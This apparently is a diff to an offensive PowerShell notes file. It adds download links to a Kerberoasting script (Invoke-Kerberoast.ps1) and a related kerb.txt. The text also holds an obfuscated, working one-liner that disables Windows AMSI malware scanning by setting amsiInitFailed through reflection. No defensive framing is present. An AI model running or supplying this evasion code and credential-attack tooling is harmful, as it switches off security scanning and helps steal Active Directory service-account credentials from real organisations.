@@ -6,6 +6,10 @@ https://raw.githubusercontent.com/gangstanthony/PowerShell/refs/heads/master/Get
 
 https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/clip.txt
 
+https://gist.githubusercontent.com/0xbadjuju/0ebe02983273048c237a8b24633cee3f/raw/c385a21c230ee0e274293aa4e50b5b9ed4197df2/Invoke-Kerberoast.ps1
+
+https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/kerb.txt
+
 ==============================================================================================================================
 
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
